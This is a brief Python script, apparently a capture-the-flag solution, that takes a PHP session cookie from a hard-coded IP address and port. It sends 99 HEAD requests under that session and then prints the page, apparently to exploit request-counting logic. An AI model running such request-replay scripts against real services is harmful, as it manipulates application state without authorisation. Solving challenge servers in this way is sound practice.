import requests

session = requests.session()

burp0_url = "http://93.77.183.219:10010/"

res = session.head(burp0_url)
burp0_cookies = {"PHPSESSID": res.cookies["PHPSESSID"]}
for i in range(99):
    session.head(burp0_url, cookies=burp0_cookies)
res = session.get(burp0_url, cookies=burp0_cookies)
print(res.text)
    